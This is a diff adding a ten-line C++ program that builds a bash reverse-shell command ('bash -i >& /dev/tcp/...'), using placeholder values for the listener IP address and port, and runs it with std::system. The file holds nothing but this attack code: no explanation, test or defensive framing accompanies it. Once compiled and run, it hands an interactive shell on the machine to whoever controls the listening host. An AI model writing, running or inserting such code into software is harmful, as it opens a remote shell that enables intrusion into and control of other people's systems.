@@ -1,0 +1,10 @@
+#include <iostream>
+#include <cstdlib>
+int main()
+{
+std::string ip = "YOUR_IP_ADDRESS";
+std::string port = "YOUR_PORT";
+std::string reverse_shell = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+std::system(reverse_shell.c_str());
+return 0;
+}
